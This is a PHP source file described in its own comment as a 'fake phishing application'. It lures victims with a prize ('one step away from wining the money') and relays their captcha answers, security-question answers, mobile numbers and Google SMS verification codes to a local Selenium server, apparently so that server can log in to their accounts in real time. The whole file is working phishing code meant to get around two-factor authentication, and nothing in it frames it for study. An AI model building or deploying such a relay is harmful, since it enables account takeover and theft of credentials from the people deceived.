<?php
//A very basic fake phishing application can be like this.It will communicate with the custom selenium web server using CURL.
//GET the content of a remote XML file
//ini_set('display_errors',1);
$act = $_REQUEST["action"];
$data = $_REQUEST["data"];
$act = "action=".$act;
$data = "data=".$data;
$p = $act."&".$data;
$res = send($p);
$st = substr($res,-4,4);

if ($st == "true")
{
	echo '<p><b>Are you a human??</b></p></br><p>Type the characters you see in the picture below</p>';
	echo '<img src="captcha.png">';
	echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
	echo '<input type="hidden" name="action" value="captcha">';
	echo '<input type="text" name="data" value="">';
	echo '<input type="submit">';
	echo '</form>';
}
if ($st == "FAIL")		//When Captcha fail
{
        echo '<p><b>Are you a human??</b></p></br><p>Type the characters you see in the picture below</p>';
	echo '<p>Wrong answer!Try Again!</p>';
        echo '<img src="captcha.png">';
        echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
        echo '<input type="hidden" name="action" value="captcha">';
        echo '<input type="text" name="data" value="">';
        echo '<input type="submit">';
        echo '</form>';
}

if ($st == "false")
{
	echo "Captcha is not available!";
}
//echo the secuirty question
if ($st == "ques")
{
	echo '<p>You are one step away from wining the money.One last question</p>';
        echo substr($res,31,-6);
	echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
	echo '<input type="hidden" name="action" value="ans">';
	echo '<input type="text" name="data" value="">';
	echo '<input type="submit">';
	echo '</form>';
}

if ($st == "SMSV")
{
        echo '<p>You are one step away from wining the money.One last question</p>';
        echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
        echo '<p>Enter your mobile number!you will recieve a verification code from Google</p>';
	echo '<input type="hidden" name="action" value="sms">';
        echo '<input type="text" name="data" value="">';
        echo '<input type="submit">';
        echo '</form>';
}


if ($st == "INCR")	//if entered phone number is incorrect
{
        echo '<p>You are one step away from wining the money.One last question</p>';
        echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
        echo '<p>Wrong Mobile Number!Enter your mobile number!you will recieve a verification code from Google</p>';
        echo '<input type="hidden" name="action" value="sms">';
        echo '<input type="text" name="data" value="">';
        echo '<input type="submit">';
        echo '</form>';
}

if ($st == "CORR")	//IF entered phonenumer is correct ask for pin code
{
        echo '<p>You are one step away from wining the money.One last question</p>';
        echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
        echo '<p>Hope you have recieved the confirmation code from Google!</p></br><p>Now enter the code here</p>';
        echo '<input type="hidden" name="action" value="pin">';
        echo '<input type="text" name="data" value="">';
        echo '<input type="submit">';
        echo '</form>';
}


if ($st == "")
{
        echo '<form method="POST" action="'.$_SERVER['PHP_SELF'].'">';
        echo '<input type="hidden" name="action" value="captcha">';
        echo '<input type="text" name="data" value="">';
        echo '<input type="submit">';
        echo '</form>';
}


//Send request to Custom Selenium Web Server using PHP curl.
function send($post)
{
        $URL =  "http://127.0.0.1:9999/";
        $ch = curl_init($URL);
        curl_setopt($ch, CURLOPT_POST, 1);
//      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: text/html'));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
}
?>

